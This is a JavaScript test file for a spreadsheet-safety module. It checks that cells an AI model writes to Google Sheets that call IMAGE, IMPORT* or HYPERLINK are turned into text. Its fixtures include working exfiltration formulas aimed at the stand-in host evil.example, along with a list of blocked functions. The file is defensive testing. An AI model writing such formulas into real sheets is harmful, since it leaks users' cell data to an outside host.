// Sheets: a cell the model writes that calls IMAGE / IMPORT* / HYPERLINK must reach Google as TEXT, not as a formula.
// Real runTool + real Sheets helpers + real journal code; only the network edge is stubbed and RECORDS what would be
// sent. This does NOT show how the real Sheets API treats a leading apostrophe under USER_ENTERED (UNVERIFIED).
import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { neutralizeCell, neutralizeGrid, neutralizedNote, BLOCKED_FUNCTIONS } from '../api/lib/sheetSafety.js';

process.env.SUPABASE_URL = 'http://stub.invalid';
process.env.SUPABASE_SERVICE_ROLE_KEY = 'service-role-stub';
const { runTool } = await import('../api/lib/claudeTools.js');
const { updateSheetValues } = await import('../api/lib/google.js');

const root = fileURLToPath(new URL('../', import.meta.url));
const EXFIL = '=IMAGE("https://evil.example/p.png?d="&A1&B1)';

// ---- the cell rule -------------------------------------------------------------------------------------------------
test('cells that call a network function are turned into text, whatever the case, spacing or hiding', () => {
  const bad = [
    EXFIL, '=image("https://evil.example/?d="&A1)', '=IMAGE ("x")', '=IMAGE\u00a0("x")', '=IMAGE\t("x")',
    '=IF(TRUE,IMPORTXML("https://e.example","//a"))', '=IMPORTDATA("https://e.example/x.csv")', '=IMPORTHTML("https://e.example","table",1)',
    '=IMPORTFEED("https://e.example/rss")', '=IMPORTRANGE("https://docs.google.com/spreadsheets/d/abc","A1:B2")',
    '=HYPERLINK("https://evil.example/?d="&A1,"open")', '=QUERY(IMPORTRANGE("u","A:B"),"select *")', '=CONCATENATE("a",IMAGE("x"))',
    '  =IMAGE("x")', '\n=IMAGE("x")', '\u200b=IMAGE("x")', '\ufeff=IMAGE("x")', '+IMAGE("x")', '-IMAGE("x")', '@IMAGE("x")',
  ];
  for (const cell of bad) {
    const r = neutralizeCell(cell);
    assert.equal(r.value, `'${cell}`, JSON.stringify(cell));
    assert.ok(BLOCKED_FUNCTIONS.includes(r.fn), JSON.stringify(cell));
  }
});

test('everything else is written as it was: ordinary formulas, text, numbers, empty cells, cells already text', () => {
  const fine = [
    '=SUM(A1:A9)', '=VLOOKUP(A1,B:C,2,FALSE)', '=IF(A1>1,"x","y")', '=GOOGLEFINANCE("GOOG")', '=ARRAYFORMULA(A1:A3*2)', '=A1&" "&B1',
    'Use =IMAGE( in a cell', 'IMAGE(x)', 'notes: IMPORTRANGE(', '=MYIMAGE(1)', '=A.IMAGE(1)', '=IMAGES(1)', '=IMAGE', '=IMAGE;', '\'=IMAGE("x")', '',
  ];
  for (const cell of fine) assert.deepEqual(neutralizeCell(cell), { value: cell, fn: null }, JSON.stringify(cell));
  assert.deepEqual(neutralizeCell(42), { value: '42', fn: null });
  assert.deepEqual(neutralizeCell(null), { value: '', fn: null });
  assert.deepEqual(neutralizeCell(undefined), { value: '', fn: null });
});

test('a grid keeps its shape, accepts bare scalar rows, and reports positions and function names, never content', () => {
  const { rows, hits } = neutralizeGrid([['Name', '=SUM(1,2)'], [EXFIL, 'ok', '=HYPERLINK("https://e.example","x")'], 'solo', null, [7, null]]);
  assert.deepEqual(rows, [['Name', '=SUM(1,2)'], [`'${EXFIL}`, 'ok', `'=HYPERLINK("https://e.example","x")`], ['solo'], [''], ['7', '']]);
  assert.deepEqual(hits, [{ row: 1, col: 0, function: 'IMAGE' }, { row: 1, col: 2, function: 'HYPERLINK' }]);
  assert.ok(!JSON.stringify(hits).includes('evil.example'));
  assert.deepEqual(neutralizeGrid(undefined), { rows: [], hits: [] });
  assert.deepEqual(neutralizeGrid('not a grid'), { rows: [], hits: [] });
  assert.deepEqual(neutralizedNote([]), {});
  const note = neutralizedNote(hits);
  assert.equal(note.neutralized_cells, 2);
  assert.match(note.neutralized_note, /IMAGE, HYPERLINK/);
  assert.match(note.neutralized_note, /Tell the user/);
  assert.equal(neutralizedNote(Array.from({ length: 50 }, (_, i) => ({ row: i, col: 0, function: 'IMAGE' }))).neutralized.length, 20, 'the report is capped');
});

// ---- through the real tool path ------------------------------------------------------------------------------------
const realFetch = globalThis.fetch;
const sheetCalls = []; // { method, url, body }
const journal = [];    // bodies POSTed to sheet_edits
function stub({ before = [['old1', 'old2']] } = {}) {
  sheetCalls.length = 0; journal.length = 0;
  globalThis.fetch = async (url, opts = {}) => {
    url = String(url);
    const method = opts.method || 'GET';
    const json = (o, s = 200) => new Response(JSON.stringify(o), { status: s, headers: { 'content-type': 'application/json' } });
    if (url.includes('/rest/v1/connectors')) return json([{ id: 'c1', access_token: 'tok', token_expires_at: '2099-01-01T00:00:00Z', refresh_token: null }]);
    if (url.includes('/rest/v1/sheet_edits')) { journal.push(JSON.parse(opts.body)); return json({ id: 'edit-1' }); }
    if (url.startsWith('https://sheets.googleapis.com/v4/spreadsheets')) {
      sheetCalls.push({ method, url, body: opts.body ? JSON.parse(opts.body) : null });
      if (method === 'GET') return json({ values: before });
      if (method === 'POST' && url.endsWith('/v4/spreadsheets')) return json({ spreadsheetId: 'sheet-1', properties: { title: 'T' }, spreadsheetUrl: 'https://docs.google.com/spreadsheets/d/sheet-1/edit' });
      if (url.includes(':append')) return json({ updates: { updatedRange: 'Sheet1!A5:B6', updatedRows: 2 } });
      return json({ updatedRange: 'Sheet1!A1:B2', updatedRows: 2 });
    }
    throw new Error('unexpected request in test: ' + url);
  };
}
test.after(() => { globalThis.fetch = realFetch; });
const call = (name, input) => runTool({ id: 'tu1', name, input }, { id: 'u1' }, {});
const writes = () => sheetCalls.filter((c) => c.method !== 'GET' && c.body?.values);

test('update_sheet (replace): the exfiltration formula reaches Google as text; ordinary formulas stay formulas', async () => {
  stub();
  const out = await call('update_sheet', { spreadsheet_id: 'sheet-1', range: 'A1', values: [['Total', '=SUM(B1:B9)'], [EXFIL, '=VLOOKUP(A1,C:D,2,FALSE)']] });
  const w = writes();
  assert.equal(w.length, 1);
  assert.equal(w[0].method, 'PUT');
  assert.deepEqual(w[0].body.values, [['Total', '=SUM(B1:B9)'], [`'${EXFIL}`, '=VLOOKUP(A1,C:D,2,FALSE)']]);
  assert.ok(!w[0].body.values.flat().some((c) => c.startsWith('=IMAGE')), 'no cell starts as an IMAGE formula');
  const result = JSON.parse(out.content);
  assert.equal(result.neutralized_cells, 1);
  assert.deepEqual(result.neutralized, [{ row: 1, col: 0, function: 'IMAGE' }]);
  assert.ok(!out.content.includes('evil.example'), 'the report never repeats the cell content');
  assert.equal(journal.length, 1);
  assert.deepEqual(journal[0].after_state, w[0].body.values, 'the journal records exactly what was written, so redo repeats it');
  assert.deepEqual(journal[0].before_state, [['old1', 'old2'], ['', '']].slice(0, 2), 'undo restores what was there before');
});

test('update_sheet (append) is covered too, and a clean write adds no warning fields', async () => {
  stub();
  const out = await call('update_sheet', { spreadsheet_id: 'sheet-1', range: 'A1', append: true, values: [['x', '=IMPORTRANGE("https://docs.google.com/spreadsheets/d/other","A:Z")'], ['y', 'z']] });
  const w = writes();
  assert.equal(w.length, 1);
  assert.match(w[0].url, /:append\?valueInputOption=USER_ENTERED/);
  assert.equal(w[0].body.values[0][1], `'=IMPORTRANGE("https://docs.google.com/spreadsheets/d/other","A:Z")`);
  assert.equal(JSON.parse(out.content).neutralized_cells, 1);
  assert.deepEqual(journal[0].after_state, w[0].body.values);

  stub();
  const clean = JSON.parse((await call('update_sheet', { spreadsheet_id: 'sheet-1', range: 'A1', values: [['a', '=SUM(1,2)']] })).content);
  assert.ok(!('neutralized_cells' in clean) && !('neutralized_note' in clean));
});

test('create_spreadsheet: headers and rows are both covered, bare scalar rows still work', async () => {
  stub();
  const out = await call('create_spreadsheet', { title: 'T', headers: ['Name', EXFIL], rows: [['a', '=HYPERLINK("https://evil.example/?d="&A2,"go")'], 'solo', ['=SUM(1,2)']] });
  const w = writes();
  assert.equal(w.length, 1);
  assert.deepEqual(w[0].body.values, [['Name', `'${EXFIL}`], ['a', `'=HYPERLINK("https://evil.example/?d="&A2,"go")`], ['solo'], ['=SUM(1,2)']]);
  const result = JSON.parse(out.content);
  assert.equal(result.neutralized_cells, 2);
  assert.deepEqual(result.neutralized.map((h) => [h.row, h.col, h.function]), [[0, 1, 'IMAGE'], [1, 1, 'HYPERLINK']]);
  stub();
  await call('create_spreadsheet', { title: 'T', rows: [[EXFIL]] });
  assert.deepEqual(writes()[0].body.values, [[`'${EXFIL}`]], 'without headers the first row is still checked');
});

test('the low-level writer is untouched: undo/redo can put the user\'s own formulas back', async () => {
  stub();
  const own = '=IMAGE("https://cdn.example/logo.png")';
  await updateSheetValues('tok', { spreadsheetId: 'sheet-1', range: 'A1', values: [[own, '=IMPORTRANGE("u","A1")']], append: false });
  assert.deepEqual(writes()[0].body.values, [[own, '=IMPORTRANGE("u","A1")']]);
  const history = readFileSync(`${root}api/lib/sheetHistory.js`, 'utf8');
  assert.ok(!/sheetSafety/.test(history), 'sheetHistory restores the user\'s own cells and must not rewrite them');
});

// ---- nothing else may write cells -----------------------------------------------------------------------------------
test('only the reviewed files call the Sheets writers; a new caller fails until it is reviewed', () => {
  const dirs = ['api', 'api/lib', 'api/cron', 'api/agents', 'api/connectors', 'api/admin'];
  const callers = new Set();
  for (const d of dirs) {
    for (const f of readdirSync(`${root}${d}`, { withFileTypes: true })) {
      if (!f.isFile() || !/\.js$/.test(f.name)) continue;
      const src = readFileSync(`${root}${d}/${f.name}`, 'utf8').replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
      if (/\b(updateSheetValues|createSpreadsheet)\(/.test(src) && f.name !== 'google.js') callers.add(`${d}/${f.name}`);
    }
  }
  assert.deepEqual([...callers].sort(), ['api/lib/claudeTools.js', 'api/lib/sheetHistory.js']);
  const tools = readFileSync(`${root}api/lib/claudeTools.js`, 'utf8');
  for (const m of tools.matchAll(/\b(updateSheetValues|createSpreadsheet)\(token,/g)) {
    const before = tools.slice(Math.max(0, tools.lastIndexOf("if (name === '", m.index)), m.index);
    assert.match(before, /neutralizeGrid\(/, `${m[1]} is called in the model path without neutralizeGrid()`);
  }
  const sheets = [...tools.matchAll(/\b(updateSheetValues|createSpreadsheet)\(token,/g)];
  assert.equal(sheets.length, 3, 'update_sheet (append and replace) and create_spreadsheet are the only model-path writers');
});
